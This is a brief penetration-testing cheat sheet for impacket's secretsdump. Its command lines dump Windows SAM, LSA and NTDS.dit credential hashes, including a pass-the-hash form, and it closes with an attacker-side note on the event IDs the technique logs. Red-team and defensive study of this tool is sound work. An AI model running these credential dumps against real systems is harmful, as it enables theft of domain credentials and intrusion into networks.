### Source
https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py  

### Dump registry hives and other data
```
impacket-secretsdump -dc-ip <dcIp> <domain>/<user>:<password>@<rhost> -history
```

### Using with pass the hash
```
impacket-secretsdump -hashes :<ntlmHash> -dc-ip <dcIp> <domain>/<user>@<rhost>
```

### Dump only ntds.dit (can also use DRSGetNCCHanges Method)
```
impacket-secretsdump -just-dc <domain>/<user>:<password>@<rhost>
```

### Dump credentials of single user
```
impacket-secretsdump -just-dc <domain>/<user>:<password>@<rhost> -just-dc-user <user>
```

### Dump from local registry hive copies
```
impacket-secretsdump -system <systemFile> -sam <samFile> -security <securityFile> LOCAL
```

### Dump from local system and ntds.dit
```
impacket-secretsdump -ntds <ntdsFile> -system <systemFile> LOCAL
```

### Opsec considerations 
```
Windows Security Log Event IDs
-Logon (4624)
-Logoff (4634)
-Special Logon (4672)

Windows System Logs
Service Control Manager (7040) -> multiple
```

